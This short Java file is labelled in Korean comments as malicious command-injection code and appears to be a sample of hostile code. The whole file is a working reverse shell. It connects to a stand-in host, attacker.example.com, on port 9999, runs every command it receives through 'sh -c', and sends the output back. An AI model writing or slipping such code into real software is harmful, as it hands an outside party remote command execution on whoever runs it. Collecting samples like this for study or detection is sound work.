// 악성 — 사용자 입력을 Runtime.exec로 무검증 실행 (Command Injection)
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

public class CommandInjection {
    public static void main(String[] args) throws Exception {
        // attacker 서버로부터 명령 받기
        Socket sock = new Socket("attacker.example.com", 9999);
        BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));

        String cmd;
        while ((cmd = in.readLine()) != null) {
            // 받은 문자열을 그대로 셸에서 실행 → RCE
            Process proc = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            proc.getInputStream().transferTo(sock.getOutputStream());
        }
    }
}
